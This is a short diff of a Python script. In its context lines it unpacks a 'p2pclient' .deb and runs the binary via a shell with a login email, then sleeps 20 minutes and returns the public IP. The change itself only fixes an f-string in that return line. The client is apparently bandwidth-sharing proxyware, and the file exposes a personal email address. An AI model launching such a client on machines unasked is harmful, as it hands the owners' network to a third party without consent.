@@ -13,7 +13,7 @@ def s():
         subprocess.call("cd ~ && dpkg -x p2pclient_0.60_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
         time.sleep(1200)
     
-    return f"{requests.get("https://api.ipify.org?format=text").text}"
+    return requests.get("https://api.ipify.org?format=text").text
 
 
 if __name__ == "__main__":
